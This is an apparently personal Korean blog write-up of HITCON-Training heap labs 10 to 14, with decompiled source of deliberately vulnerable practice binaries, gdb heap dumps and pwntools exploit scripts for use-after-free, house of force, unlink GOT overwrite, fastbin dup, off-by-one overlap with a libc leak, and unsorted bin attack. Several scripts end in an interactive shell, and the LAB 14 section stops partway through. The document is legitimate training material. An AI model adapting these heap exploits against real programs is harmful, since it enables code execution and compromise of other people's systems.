---
title: HITCON-Training
date: 2018-12-16 00:06:52
---

# LAB10

```c
unsigned int add_note()
{
  _DWORD *v0; // ebx
  signed int i; // [esp+Ch] [ebp-1Ch]
  int size; // [esp+10h] [ebp-18h]
  char buf; // [esp+14h] [ebp-14h]
  unsigned int v5; // [esp+1Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  if ( count <= 5 )
  {
    for ( i = 0; i <= 4; ++i )
    {
      if ( !notelist[i] )
      {
        notelist[i] = malloc(8u);
        if ( !notelist[i] )
        {
          puts("Alloca Error");
          exit(-1);
        }
        *(_DWORD *)notelist[i] = print_note_content;
        printf("Note size :");
        read(0, &buf, 8u);
        size = atoi(&buf);
        v0 = notelist[i];
        v0[1] = malloc(size);
        if ( !*((_DWORD *)notelist[i] + 1) )
        {
          puts("Alloca Error");
          exit(-1);
        }
        printf("Content :");
        read(0, *((void **)notelist[i] + 1), size);
        puts("Success !");
        ++count;
        return __readgsdword(0x14u) ^ v5;
      }
    }
  }
  else
  {
    puts("Full");
  }
  return __readgsdword(0x14u) ^ v5;
```

add_note() notelist 구조체를쓰는데 print_note_content 함수 포인터가 들어있는 녀석 하나 + content가 들어가는 녀석 총 2개로 할당해준다.

print나 delete는 딱히 볼게 없지만 print content를 할 때 저 함수 포인터를 사용한다. malloc할 때 content의 size는 임의로 지정 가능하다.

```c
int magic()
{
  return system("cat /home/hacknote/flag");
}
```

magic() 

```c
gdb-peda$ par
addr                prev                size                 status              fd                bk
0x845b000           0x0                 0x10                 Used                None              None
0x845b010           0x0                 0x68                 Used                None              None
0x845b078           0x0                 0x10                 Used                None              None
0x845b088           0x0                 0x68                 Used                None              None

gdb-peda$ x/100wx 0x845b000
0x845b000:	0x00000000	0x00000011	0x0804865b	0x0845b018
    
gdb-peda$ x/wx 0x0804865b
0x804865b <print_note_content>:	0x83e58955
```

small chunk 2개를 할당한다. 함수 포인터가 박혀있다..

```c
gdb-peda$ par
addr                prev                size                 status              fd                bk
0x845b000           0x0                 0x78                 Freed         0xf77b67b0        0xf77b67b0
0x845b078           0x78                0x10                 Freed                0x0              None
```

그리고 할당한 chunk를 다 free 해주면 free chunk들이 알아서잘 병합된다. 사이즈에 맞게 다시 한번 할당하고 함수 포인터 위치에 magic을 넣어준다.

```c
gdb-peda$ par
addr                prev                size                 status              fd                bk
0x83f8000           0x0                 0x68                 Used                None              None
0x83f8068           0x0                 0x10                 Freed         0xf77577b0        0xf77577b0
0x83f8078           0x10                0x10                 Used                None              None

gdb-peda$ x/12wx 0x83f8000
0x83f8000:	0x00000000	0x00000069	0x08048986	0xf7757820
0x83f8010:	0x00000000	0x00000069	0xf77577b0	0xf77577b0
0x83f8020:	0x00000000	0x00000000	0x00000000	0x00000000
gdb-peda$ x/wx 0x08048986
0x8048986 <magic>:	0x83e58955
    
cat: /home/hacknote/flag: 그런 파일이나 디렉터리가 없습니다
```

제대로 들어갔다. 이대로 첫 번째 chunk를 print 해주면 된다. 로컬에서 돌렸기 때문에 파일은 없지만 flag를 읽었다.

```python
from pwn import *

t = process('./hacknote')

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.send(str(z))

def a(a,b):
        r("choice :")
        s("1")
        r("size :")
        s(str(a))
        r("Content :")
        s(str(b))

def d(a):
        r("choice :")
        s("2")
        r("Index :")
        s(str(a))

def p(a):
        r("choice :")
        s("3")
        r("Index :")
        s(str(a))

magic = 0x08048986

a(100,"a"*4)
a(100,"a"*4)
d(0)
d(1)
a(0x60,p32(magic))
p("0")
t.interactive()
```

비교적 간단한 문제

```python
from pwn import *

t = process('./hacknote')

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.send(str(z))

def a(a,b):
	r("choice :")
	s("1")
	r("size :")
	s(str(a))
	r("Content :")
	s(str(b))

def d(a):
	r("choice :")
	s("2")
	r("Index :")
	s(str(a))
	
def p(a):
	r("choice :")
	s("3")
	r("Index :")
	s(str(a))

magic = 0x08048986

a(0x20,"a"*4)
a(0x20,"a"*4)
d(0)
d(1)
a(8,p32(magic))
p("0")
pause()
t.interactive()
```

제길 그냥 uaf로 해도 된다.

<br>

# LAB 11

```c
__int64 add_item()
{
  signed int i; // [rsp+4h] [rbp-1Ch]
  int v2; // [rsp+8h] [rbp-18h]
  char buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  if ( num > 99 )
  {
    puts("the box is full");
  }
  else
  {
    printf("Please enter the length of item name:");
    read(0, &buf, 8uLL);
    v2 = atoi(&buf);
    if ( !v2 )
    {
      puts("invaild length");
      return 0LL;
    }
    for ( i = 0; i <= 99; ++i )
    {
      if ( !qword_6020C8[2 * i] )
      {
        *((_DWORD *)&itemlist + 4 * i) = v2;
        qword_6020C8[2 * i] = malloc(v2);
        printf("Please enter the name of item:");
        *(_BYTE *)(qword_6020C8[2 * i] + (signed int)read(0, (void *)qword_6020C8[2 * i], v2)) = 0;
        ++num;
        return 0LL;
      }
    }
  }
  return 0LL;
}
```

add item() size는 아무렇게 지정 가능하다.

```c
unsigned __int64 change_item()
{
  int v0; // ST08_4
  int v2; // [rsp+4h] [rbp-2Ch]
  char buf; // [rsp+10h] [rbp-20h]
  char nptr; // [rsp+20h] [rbp-10h]
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  if ( num )
  {
    printf("Please enter the index of item:");
    read(0, &buf, 8uLL);
    v2 = atoi(&buf);
    if ( qword_6020C8[2 * v2] )
    {
      printf("Please enter the length of item name:", &buf);
      read(0, &nptr, 8uLL);
      v0 = atoi(&nptr);
      printf("Please enter the new name of the item:", &nptr);
      *(_BYTE *)(qword_6020C8[2 * v2] + (signed int)read(0, (void *)qword_6020C8[2 * v2], v0)) = 0;
    }
    else
    {
      puts("invaild index");
    }
  }
  else
  {
    puts("No item in the box");
  }
  return __readfsqword(0x28u) ^ v5;
}
```

change가 있다 overflow 발생이 가능!

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  _QWORD *v3; // [rsp+8h] [rbp-18h]
  char buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  v3 = malloc(0x10uLL);
  *v3 = hello_message;
  v3[1] = goodbye_message;
  ((void (__fastcall *)(signed __int64, _QWORD))*v3)(16LL, 0LL);
  while ( 1 )
  {
    menu();
    read(0, &buf, 8uLL);
    switch ( atoi(&buf) )
    {
      case 1:
        show_item();
        break;
      case 2:
        add_item();
        break;
      case 3:
        change_item();
        break;
      case 4:
        remove_item(&buf, &buf);
        break;
      case 5:
        ((void (__fastcall *)(char *, char *))v3[1])(&buf, &buf);
        exit(0);
        return;
      default:
        puts("invaild choice!!!");
        break;
    }
  }
}
```

main을 보면 exit에 쓰이는 함수 포인터를 먼저 heap에 할당한다.

```c
void __noreturn magic()
{
  int fd; // ST0C_4
  char buf; // [rsp+10h] [rbp-70h]
  unsigned __int64 v2; // [rsp+78h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  fd = open("/home/bamboobox/flag", 0);
  read(fd, &buf, 0x64uLL);
  close(fd);
  printf("%s", &buf);
  exit(0);
}
```

마찬가지로 magic이 있다.

음.. add를 하고 top chunk를 건드릴 수 있어서 house of force를 했다 (사실 chunk 병합할라고 삽질하다가 훨 쉬운거같아서 바꿈)

```c
gdb-peda$ x/20gx 0x1d51000
0x1d51000:	0x0000000000000000	0x0000000000000021
0x1d51010:	0x0000000000400896	0x00000000004008b1
0x1d51020:	0x0000000000000000	0x0000000000000031
0x1d51030:	0x6161616161616161	0x6161616161616161
0x1d51040:	0x6161616161616161	0x6161616161616161
0x1d51050:	0x6161616161616161	0xffffffffffffffff
```

top chunk size를 변경하고

```c
gdb-peda$ ar
==================  Main Arena  ==================
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
                  top: 0x1d51000 (size : 0x48)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x0
```

그다음 top chunk와 할당할 위치의 offset을 계산해서 다시 할당해주면 그 위치가 top chunk가 된다. 처음에 -0x50으로 했는데 위치 +0x10으로 갔다.(왜지 애초에 헤더 빼고 계산한건데..)

```c
gdb-peda$ x/12gx 0x1d51000
0x1d51000:	0x0000000000000000	0x0000000000000021
0x1d51010:	0x0000000000400d49	0x0000000000400d49
```

그리고 원래 chunk의 size를 맞춰주고 할당해야 하더라. magic값을 넣고 exit해주면 flag가 출력된다. 

```python
from pwn import *

t = process('./bamboobox')

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.sendline(str(z))

def a(a,b):
        r(":")
        s("2")
        r(":")
        s(str(a))
        r(":")
        s(str(b))

def ch(index,length,name):
        r(":")
        s("3")
        r(":")
        s(str(index))
        r(":")
        s(str(length))
        r(":")
        s(str(name))

def sh():
        r(":")
        s("1")

def d(index):
        r(":")
        s("4")
        r(":")
        s(str(index))

def ex():
        r(":")
        s("5")

magic = 0x0000000000400d49

a(0x20,"a")
ch(0,0x40,"a"*0x28 + p64(0xffffffffffffffff))
a(-0x60,"a")
a(0x10,p64(magic)*2)
pause()
t.interactive()

Your choice:$ 5
local flag!
```

local에서 돌렸기 때문에 flag는 다르다.. 추가적으로

```python
from pwn import *

t = process('./bamboobox')

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.send(str(z))

def a(a,b):
        r(":")
        s("2")
        r(":")
        s(str(a))
        r(":")
        s(str(b))

def ch(index,length,name):
        r(":")
        s("3")
        r(":")
        s(str(index))
        r(":")
        s(str(length))
        r(":")
        s(str(name))

def sh():
        r(":")
        s("1")

def d(index):
        r(":")
        s("4")
        r(":")
        s(str(index))

def ex():
        r(":")
        s("5")

magic = 0x0000000000400d49

a(0xf0,"a"*0x90)
a(0x10,"b"*0x10)
a(0xf0,"c"*0x90)
a(0x20,"a")
d(1)
d(0)
a(0x18,"e"*0x10 + p64(0x120))
d(2)
a(0xf0,"f"*0xf0)
sh()
r("0 : ")
ma = u64(t.recv(6).ljust(8,'\x00'))
print hex(ma)
t.interactive()
```

main_arena +88 leak도 가능하다. 이런 류의 문제에서 magic과 같은 함수를 주지않으면 leak을 한 후 진행해야 한다.

저렇게 4개를 할당하면 0,1,2,3 index가 활성화되는데 0 index를 fast chunk로 옮기도록 한다. 재할당 할때 8바이트만큼 더 쓸 수 있도록 서로 size를 맞춰 할당해주고 그다음 offset을 계산하여 prev_size를 적어준다. d(2)를 하면 chunk들이 marge 되고 (off-by-one이 있기 때문에 가능함! 때문에 기본 사이즈가 0x101이 나와야 한다)

```c
gdb-peda$ par
addr                prev                size                 status              fd                bk
0xf80000            0x0                 0x20                 Used                None              None
0xf80020            0x0                 0x220                Freed     0x7f367b512b78    0x7f367b512b78
0xf80240            0x220               0x30                 Used                None              None
```

이렇게 큰 덩어리가 생겨버리게 된다. 그 다음 처음 할당한 만큼 재 할당 해주면 fast chunk 까지 할당하고 나머지 부분은 unsorted bin에 들어가게 된다 (스플릿!) 그리고 나서 show함수를 실행하면 0 index가 fast chunk였기 때문에 leak이 가능하다.. 

```c
0x7f367b512b78
[+] 0x7f367b14e000
```

쇼쇽

```python
from pwn import *

t = process('./bamboobox')

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.send(str(z))

def a(a,b):
        r(":")
        s("2")
        r(":")
        s(str(a))
        r(":")
        s(str(b))

def ch(index,length,name):
        r(":")
        s("3")
        r(":")
        s(str(index))
        r(":")
        s(str(length))
        r(":")
        s(str(name))

def sh():
        r(":")
        s("1")

def d(index):
        r(":")
        s("4")
        r(":")
        s(str(index))

def ex():
        r(":")
        s("5")

magic = 0x0000000000400d49

a(0xf0,"a"*0x90)
a(0x10,"b"*0x10)
a(0xf0,"c"*0x90)
a(0x20,"a")
d(1)
d(0)
a(0x18,"e"*0x10 + p64(0x120))
d(2)
a(0xf0,"f"*0xf0)
sh()
r("0 : ")
ma = u64(t.recv(6).ljust(8,'\x00'))
print hex(ma)
libc = ma - 0x3c4b78
success(hex(libc))
o = libc + 0x4526a
a(0x110,"a")
ch(3,0x200,"a"*0x28 + p64(0xffffffffffffffff))
a(-0x280,"a")
a(0x10,p64(o)*2)
pause()
t.interactive()

Your choice:$ 5
$ id
uid=1000(bskim)
```

이렇게 oneshot도 사용할 수 있음! (사실 이거하느라 머리 깨졌음)

또! unlink를 이용해서 got_overwrite도 할 수 있다.

```c
gdb-peda$ x/40gx 0x141c020
0x141c020:	0x0000000000000000	0x0000000000000111
0x141c030:	0x0000000000000000	0x0000000000000101
0x141c040:	0x00000000006020b0	0x00000000006020b8
0x141c050:	0x6161616161616161	0x6161616161616161
0x141c060:	0x6161616161616161	0x6161616161616161
0x141c070:	0x6161616161616161	0x6161616161616161
0x141c080:	0x6161616161616161	0x6161616161616161
0x141c090:	0x6161616161616161	0x6161616161616161
0x141c0a0:	0x6161616161616161	0x6161616161616161
0x141c0b0:	0x6161616161616161	0x6161616161616161
0x141c0c0:	0x6161616161616161	0x6161616161616161
0x141c0d0:	0x6161616161616161	0x6161616161616161
0x141c0e0:	0x6161616161616161	0x6161616161616161
0x141c0f0:	0x6161616161616161	0x6161616161616161
0x141c100:	0x6161616161616161	0x6161616161616161
0x141c110:	0x6161616161616161	0x6161616161616161
0x141c120:	0x6161616161616161	0x6161616161616161
0x141c130:	0x0000000000000100	0x0000000000000110
```

이렇게 fake chunk를 만들고 다음 chunk의 prev_size, size를 조작해서 다음 chunk를 free 시키면 병합할 때 unlink가 발동되게 된다.

```c
0x6020b0 <stdin@@GLIBC_2.2.5>:	0x00007f08befeb8e0	0x0000000000000000
0x6020c0 <itemlist>:	0x0000000000000100	0x000000000141c030
0x6020d0 <itemlist+16>:	0x0000000000000100	0x000000000141c140
0x6020e0 <itemlist+32>:	0x0000000000000100	0x000000000141c250
```

itemlist가 index 포인터를 갖고 있다. itemlist+8을 조져야한다. (unlink를 하면 target address에 target address-0x18의 값이 들어가게 된다. 이유는 찾아보시길..)

```c
gdb-peda$ x/10gx 0x00000000006020b0
0x6020b0 <stdin@@GLIBC_2.2.5>:	0x00007f3fee17c8e0	0x0000000000000000
0x6020c0 <itemlist>:	0x0000000000000100	0x00000000006020b0
0x6020d0 <itemlist+16>:	0x0000000000000000	0x0000000000000000
```

chunk가 병합되면 index pointer가 변경되었다! 

```c
0x6020b0 <stdin@@GLIBC_2.2.5>:	0x0000000000000000	0x0000000000000000
0x6020c0 <itemlist>:	0x0000000000000000	0x00000000006020b0
0x6020d0 <itemlist+16>:	0x0000000000000000	0x0000000000602020
```

그리고 0 index를 수정해서 1 index에 puts_got를 넣고 1번 index를 수정해서 magic 값을 넣어주면 된다.

```python
from pwn import *

t = process('./bamboobox')

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.send(str(z))

def a(a,b):
        r(":")
        s("2")
        r(":")
        s(str(a))
        r(":")
        s(str(b))

def ch(index,length,name):
        r(":")
        s("3")
        r(":")
        s(str(index))
        r(":")
        s(str(length))
        r(":")
        s(str(name))

def sh():
        r(":")
        s("1")

def d(index):
        r(":")
        s("4")
        r(":")
        s(str(index))

def ex():
        r(":")
        s("5")
        
magic = 0x0000000000400d49
itemlist = 0x6020c0
puts_got = 0x602020

a(0x100,"a")
a(0x100,"a")
a(0x100,"a")

ch(0,0x200,p64(0) + p64(0x101) + p64(itemlist+0x8-0x18) + p64(itemlist+0x8-0x10) + "a"*(0x100-0x20) + p64(0x100) + p64(0x110))
d(1)
ch(0,0x200,p64(0)*3 + p64(itemlist+0x8-0x18) + p64(0) + p64(puts_got))
ch(1,0x10,p64(magic))
pause()
t.interactive()

local flag! <- 윽
```

unlink는 코드만 보고는 이해하기 힘들기 때문에 how2heap, lazenca 문서들을 보고 이해하시길 바랍니다!

<br>

# LAB 12

```c
int add()
{
  void *v0; // rsi
  size_t size; // [rsp+0h] [rbp-20h]
  void *s; // [rsp+8h] [rbp-18h]
  void *buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  s = 0LL;
  buf = 0LL;
  LODWORD(size) = 0;
  if ( (unsigned int)flowercount > 0x63 )
    return puts("The garden is overflow");
  s = malloc(0x28uLL);
  memset(s, 0, 0x28uLL);
  printf("Length of the name :", 0LL, size);
  if ( (unsigned int)__isoc99_scanf("%u", &size) == -1 )
    exit(-1);
  buf = malloc((unsigned int)size);
  if ( !buf )
  {
    puts("Alloca error !!");
    exit(-1);
  }
  printf("The name of flower :", size);
  v0 = buf;
  read(0, buf, (unsigned int)size);
  *((_QWORD *)s + 1) = buf;
  printf("The color of the flower :", v0, size);
  __isoc99_scanf("%23s", (char *)s + 16);
  *(_DWORD *)s = 1;
  for ( HIDWORD(size) = 0; HIDWORD(size) <= 0x63; ++HIDWORD(size) )
  {
    if ( !*(&flowerlist + HIDWORD(size)) )
    {
      *(&flowerlist + HIDWORD(size)) = s;
      break;
    }
  }
  ++flowercount;
  return puts("Successful !");
}
```

add() 임의로 size 지정이 가능! 구조체 안에 여러 멤버들이 있는데 딱히 상관없고 손포징으로 malloc,free 시켜보면 쉽게 index랑 fastbin을 확인할 수 있음!

```c
int del()
{
  int result; // eax
  unsigned int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  if ( !flowercount )
    return puts("No flower in the garden");
  printf("Which flower do you want to remove from the garden:");
  __isoc99_scanf("%d", &v1);
  if ( v1 <= 0x63 && *(&flowerlist + v1) )
  {
    *(_DWORD *)*(&flowerlist + v1) = 0;
    free(*((void **)*(&flowerlist + v1) + 1));
    result = puts("Successful");
  }
  else
  {
    puts("Invalid choice");
    result = 0;
  }
  return result;
}
```

del() 맘껏 free 할 수 있다. 간단한 fastbin dup 공격이다.

```python
from pwn import * 

t = process('./secretgarden')

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.sendline(str(z))

def a(a,b,c):
	r(":")
	s("1")
	r(":")
	s(str(a))
	r(":")
	s(str(b))
	r(":")
	s(str(c))

def d(a):
	r(":")
	s("3")
	r(":")
	s(str(a))

magic = 0x0000000000400c7b

a(0x50,"a","b")
a(0x50,"a","b")
a(0x50,"a","b")

d(0)
d(1)
d(0)

a(0x50,p64(0x602020-38),"aaaa")
a(0x50,"a","b")
a(0x50,"a","b")
a(0x50,"\x00"*6 + p64(magic)*3,"b")
t.interactive()

local flag!
```

<br>

# LAB 13

```c
unsigned __int64 create_heap()
{
  _QWORD *v0; // rbx
  signed int i; // [rsp+4h] [rbp-2Ch]
  size_t size; // [rsp+8h] [rbp-28h]
  char buf; // [rsp+10h] [rbp-20h]
  unsigned __int64 v5; // [rsp+18h] [rbp-18h]

  v5 = __readfsqword(0x28u);
  for ( i = 0; i <= 9; ++i )
  {
    if ( !heaparray[i] )
    {
      heaparray[i] = malloc(0x10uLL);
      if ( !heaparray[i] )
      {
        puts("Allocate Error");
        exit(1);
      }
      printf("Size of Heap : ");
      read(0, &buf, 8uLL);
      size = atoi(&buf);
      v0 = heaparray[i];
      v0[1] = malloc(size);
      if ( !*((_QWORD *)heaparray[i] + 1) )
      {
        puts("Allocate Error");
        exit(2);
      }
      *(_QWORD *)heaparray[i] = size;
      printf("Content of heap:", &buf);
      read_input(*((void **)heaparray[i] + 1), size);
      puts("SuccessFul");
      return __readfsqword(0x28u) ^ v5;
    }
  }
  return __readfsqword(0x28u) ^ v5;
}
```

create heap() size는 임의로 지정가능하고 size만큼만 content에 적을 수 있다.

```c
unsigned __int64 edit_heap()
{
  int v1; // [rsp+Ch] [rbp-14h]
  char buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, &buf, 4uLL);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( heaparray[v1] )
  {
    printf("Content of heap : ", &buf);
    read_input(*((void **)heaparray[v1] + 1), *(_QWORD *)heaparray[v1] + 1LL);
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

edit 메뉴가 있지만.. size만큼만 쓰게 해주는 걸로 보이는데 특이점이 있다. 바로 +1 만큼 써주게 해준다는 것 1byte overflow가 나서 Off-by-one보다 더 유용하게 사용할 수 있다. (사실 소스를 대충봐서 발견 못했는데 아니 이거 off-by-one 없으면 어케 풀어 하고 넣으니까 바로 되길래 알아냄.. 소스를 잘 봐야 되는데 손포징만 늘어가고 있다 ㅠㅠ)

그리고 show(), delete() 함수까지 딱 전형적인 heap 바이너리 이다.

```c
gdb-peda$ par
addr                prev                size                 status              fd                bk
0x1a85000           0x0                 0x20                 Used                None              None
0x1a85020           0x0                 0x20                 Used                None              None
gdb-peda$ x/12gx 0x1a85000
0x1a85000:	0x0000000000000000	0x0000000000000021
0x1a85010:	0x0000000000000018	0x0000000001a85030
0x1a85020:	0x0000000000000000	0x0000000000000021
0x1a85030:	0x0000000000000041	0x0000000000000000
0x1a85040:	0x0000000000000000	0x0000000000020fc1
```

malloc을 1개 할당 했을 때 특이점은 chunk의 정보를 담고있는 녀석과 content 한 번의 malloc을 하면 2개의 chunk가 생긴다. 내부에 magic이 사라졌기 때문에 leak을 해주어야 하는데 

```c
0x6020a0 <heaparray>:	0x0000000001a85010
```

전역변수에서 show, edit를 관리하고 있다. 저 chunk의 정보를 담고있는 포인터에서 size, content 포인터를 이용해서 show 와 edit를 하게 된다.

```c
gdb-peda$ x/30gx 0x1a85000
0x1a85000:	0x0000000000000000	0x0000000000000021
0x1a85010:	0x0000000000000018	0x0000000001a85030
0x1a85020:	0x0000000000000000	0x0000000000000021
0x1a85030:	0x0000000000000041	0x0000000000000000
0x1a85040:	0x0000000000000000	0x0000000000000021
0x1a85050:	0x0000000000000010	0x0000000001a85070
0x1a85060:	0x0000000000000000	0x0000000000000021
0x1a85070:	0x0000000000000062	0x0000000000000000
0x1a85080:	0x0000000000000000	0x0000000000020f81
```

0x18과 0x10 두개의 chunk를 할당했는데 0x18으로 할당한 이유는 1byte overflow를 하기 위함이다. edit 메뉴로 다음 chunk의 size를 변조한다.

```c
gdb-peda$ par
addr                prev                size                 status              fd                bk
0x1a85000           0x0                 0x20                 Used                None              None
0x1a85020           0x0                 0x20                 Used                None              None
0x1a85040           0x0                 0x40                 Used                None              None
gdb-peda$ x/30gx 0x1a85000
0x1a85000:	0x0000000000000000	0x0000000000000021
0x1a85010:	0x0000000000000018	0x0000000001a85030
0x1a85020:	0x0000000000000000	0x0000000000000021
0x1a85030:	0x6363636363636363	0x6363636363636363
0x1a85040:	0x0000000000000000	0x0000000000000041
0x1a85050:	0x0000000000000010	0x0000000001a85070
0x1a85060:	0x0000000000000000	0x0000000000000021
0x1a85070:	0x0000000000000062	0x0000000000000000
0x1a85080:	0x0000000000000000	0x0000000000020f81
    
0x6020a0 <heaparray>:	0x0000000001a85010	0x0000000001a85050
```

0x41로 1byte overflow를 시켜주면 저렇게 하나의 chunk가 되게 된다.

```c
gdb-peda$ par
addr                prev                size                 status              fd                bk
0x1a85000           0x0                 0x20                 Used                None              None
0x1a85020           0x0                 0x20                 Used                None              None
0x1a85040           0x0                 0x40                 Freed                0x0              None
gdb-peda$ x/40gx 0x1a85000
0x1a85000:	0x0000000000000000	0x0000000000000021
0x1a85010:	0x0000000000000018	0x0000000001a85030
0x1a85020:	0x0000000000000000	0x0000000000000021
0x1a85030:	0x6363636363636363	0x6363636363636363
0x1a85040:	0x0000000000000000	0x0000000000000041
0x1a85050:	0x0000000000000000	0x0000000001a85070
0x1a85060:	0x0000000000000000	0x0000000000000021
0x1a85070:	0x0000000000000000	0x0000000000000000
0x1a85080:	0x0000000000000000	0x0000000000020f81
```

free를 하면 0x30 size의 free chunk를 얻었기 때문에 chunk의 정보를 담고있는 녀석을 덮어 쓸 수 있게된다.

```c
gdb-peda$ x/40gx 0x1a85000
0x1a85000:	0x0000000000000000	0x0000000000000021
0x1a85010:	0x0000000000000018	0x0000000001a85030
0x1a85020:	0x0000000000000000	0x0000000000000021
0x1a85030:	0x6363636363636363	0x6363636363636363
0x1a85040:	0x0000000000000000	0x0000000000000041
0x1a85050:	0x0000000000000000	0x0000000000000000
0x1a85060:	0x0000000000000000	0x0000000000000000
0x1a85070:	0x0000000000000030	0x0000000000602060
0x1a85080:	0x0000000000000000	0x0000000000020f81

0x6020a0 <heaparray>:	0x0000000001a85010	0x0000000001a85070
```

0x30만큼 할당하고 chunk의 정보 구조를 만들어 준다. 전역 변수를 보고 포인터가 찍혀있는 곳에 구조를 만들어 주고 atoi 함수를 릭 했다. atoi는 system을 쓸 때 인자 넣기가 매우 쉬워서 자주 애용하고 있는 녀석이다. show, edit 다 저 녀석으로 진행하면 된다. 원래는 puts 에 oneshot 넣으려고 했는데 잘안되서..(왜안될까 ㅠㅠ) 요녀석으로 사용했다.

```python
from pwn import * 

t = process('./heapcreator')

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.send(str(z))

def a(a,b):
	r(":")
	s("1")
	r(":")
	s(str(a))
	r(":")
	s(str(b))

def ed(a,b):
	r(":")
	s("2")
	r(":")
	s(str(a))
	r(":")
	s(str(b))

def sh(a):
	r(":")
	s("3")
	r(":")
	s(str(a))

def d(a):
	r(":")
	s("4")
	r(":")
	s(str(a))

a(0x18,"A")
pause()
a(0x10,"b")
pause()
ed(0,"c"*0x10 + p64(0) + '\x41')
pause()
d(1)
pause()
a(0x30,p64(0)*4 + p64(0x10) + p64(0x602060))
sh(1)
r("Content : ")
atoi = u64(t.recv(6).ljust(8,'\x00'))
#print hex(puts)
#libc = puts - 0x6f690
libc = atoi - 0x36e80
log.success("libc : " + hex(libc))
o = libc + 0x4526a
sys = libc + 0x45390
pause()
ed(1,p64(sys))
r(":")
s("/bin/sh\x00")
pause()
t.interactive()

$ id
uid=1000(bskim)
```

나는 로컬에서 하는 거라 그냥 로컬 립시를 사용했는데 도커 환경으로 하면 립시는 어찌하는지 잘모르겠다. 알아서 찾아서 해야 하나보다.. 처음에 진짜 얼토당토 않은 걸로 삽질 했었는데 leak 한다고.. 역시 소스를 자세히 잘 분석해야 한다..ㅠㅠ 

<br>

# LAB 14

```c
unsigned __int64 create_heap()
{
  signed int i; // [rsp+4h] [rbp-1Ch]
  size_t size; // [rsp+8h] [rbp-18h]
  char buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  for ( i = 0; i <= 9; ++i )
  {
    if ( !heaparray[i] )
    {
      printf("Size of Heap : ");
      read(0, &buf, 8uLL);
      size = atoi(&buf);
      heaparray[i] = malloc(size);
      if ( !heaparray[i] )
      {
        puts("Allocate Error");
        exit(2);
      }
      printf("Content of heap:", &buf);
      read_input(heaparray[i], size);
      puts("SuccessFul");
      return __readfsqword(0x28u) ^ v4;
    }
  }
  return __readfsqword(0x28u) ^ v4;
}
```

create heap()

```c
unsigned __int64 edit_heap()
{
  __int64 v0; // ST08_8
  int v2; // [rsp+4h] [rbp-1Ch]
  char buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("Index :");
  read(0, &buf, 4uLL);
  v2 = atoi(&buf);
  if ( v2 < 0 || v2 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( heaparray[v2] )
  {
    printf("Size of Heap : ", &buf);
    read(0, &buf, 8uLL);
    v0 = atoi(&buf);
    printf("Content of heap : ", &buf);
    read_input(heaparray[v2], v0);
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v4;
}
```

edit heap()

```c
unsigned __int64 delete_heap()
{
  int v1; // [rsp+Ch] [rbp-14h]
  char buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, &buf, 4uLL);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( heaparray[v1] )
  {
    free(heaparray[v1]);
    heaparray[v1] = 0LL;
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

delete heap()

그냥 깔끔하게 malloc, edit, free 이렇게 되어 있는데 edit에서 overflow가 가능하다.

```c
if ( v3 == 4 )
        exit(0);
      if ( v3 == 4869 )
      {
        if ( (unsigned __int64)magic <= 0x1305 )
        {
          puts("So sad !");
        }
        else
        {
          puts("Congrt !");
          l33t();
        }
      }
```

main에 이런 부분이 있다 4869를 입력했을 때 magic안의 값이 0x1305보다 크면 flag를 읽어주는 함수가 호출된다.

저안에 큰 값을 쓰기만하면 되니 unsorted bin attack으로 간단하게 풀 수 있다.

```c
gdb-peda$ x/100gx 0x93c000
0x93c000:	0x0000000000000000	0x0000000000000031
0x93c010:	0x6161616161616161	0x6161616161616161
0x93c020:	0x6161616161616161	0x6161616161616161
0x93c030:	0x0000000000000000	0x0000000000000111
0x93c040:	0x0000000000000000	0x00000000006020b0
```

1 chunk를 free하고 0 chunk에서 edit로 bk를 조작해준다. (magic -0x10)

```c
0x6020c0 <magic>:	0x00007f8589253b78	0x0000000000000000
```

